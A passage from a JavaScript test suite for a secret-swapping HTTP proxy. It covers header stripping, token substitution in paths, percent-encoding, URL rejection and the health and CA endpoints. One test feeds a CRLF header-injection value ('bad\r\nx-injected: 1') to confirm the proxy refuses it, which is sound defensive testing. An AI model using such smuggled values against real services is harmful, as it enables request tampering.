      'proxy-authorization': 'Basic c2VjcmV0',
      'proxy-connection': 'keep-alive',
      connection: 'keep-alive, x-hop',
      'x-hop': 'drop me',
      te: 'trailers',
      upgrade: 'h2c',
      'x-end-to-end': 'keep me',
    });
    expect(res.status).toBe(200);
    const h = upstream.received[0].headers;
    for (const name of ['proxy-authorization', 'proxy-connection', 'x-hop', 'te', 'upgrade']) {
      expect(h, name).not.toHaveProperty(name);
    }
    expect(h['x-end-to-end']).toBe('keep me');
  });

  it('swaps only in the path and query, never in the URL authority', async () => {
    captureLogs();
    const upstream = await startHttpUpstream();
    const { tokenStore, port } = await startProxy();
    const tok = tokenStore.issue('k', 'real-value', { allowedHosts: hosts('http://127.0.0.1') }).id;
    const res = await viaProxy(port, `http://${tok}@127.0.0.1:${upstream.port}/`);
    expect(res.status).toBe(200);
    expect(JSON.stringify(upstream.received)).not.toContain('real-value');
  });

  it('percent-encodes unsafe characters in a swapped path and survives invalid header values', async () => {
    captureLogs();
    const upstream = await startHttpUpstream();
    const { tokenStore, port } = await startProxy();
    const allowedHosts = hosts('http://127.0.0.1');
    const spaced = tokenStore.issue('k', 'real value é', { allowedHosts }).id;
    const ok = await viaProxy(port, `http://127.0.0.1:${upstream.port}/p?k=${spaced}`);
    expect(ok.status).toBe(200);
    expect(upstream.received[0].url).toBe('/p?k=real%20value%20%C3%A9');

    // A real value that can't be a header value is refused before anything is sent.
    const crlf = tokenStore.issue('h', 'bad\r\nx-injected: 1', { allowedHosts }).id;
    const refused = await viaProxy(port, `http://127.0.0.1:${upstream.port}/`, { 'x-key': crlf });
    expect(refused.status).toBe(403);
    expect(refused.headers['x-coatcheck-denied']).toBe('invalid-value');
    expect(upstream.received).toHaveLength(1);
    // A value Node still refuses (above U+00FF) must not throw out of the request handler.
    const wide = tokenStore.issue('w', 'value \u2603', { allowedHosts }).id;
    expect((await viaProxy(port, `http://127.0.0.1:${upstream.port}/`, { 'x-key': wide })).status).toBe(502);
    expect((await fetch(`http://127.0.0.1:${port}/_health`)).status).toBe(200);
  });

  it('rejects non-http absolute URLs with 400', async () => {
    const { port } = await startProxy();
    expect((await viaProxy(port, 'https://api.example.com/')).status).toBe(400);
    expect((await viaProxy(port, 'ftp://api.example.com/')).status).toBe(400);
  });

  it('serves the vault API on the same listener', async () => {
    const { port } = await startProxy();
    const res = await fetch(`http://127.0.0.1:${port}/_health`);
    expect(await res.json()).toEqual({ status: 'ok', tokens_active: 0 });
    const ca = await (await fetch(`http://127.0.0.1:${port}/_ca`)).text();
    expect(ca).toBe(proxyCa.caCertPem);
  });
});
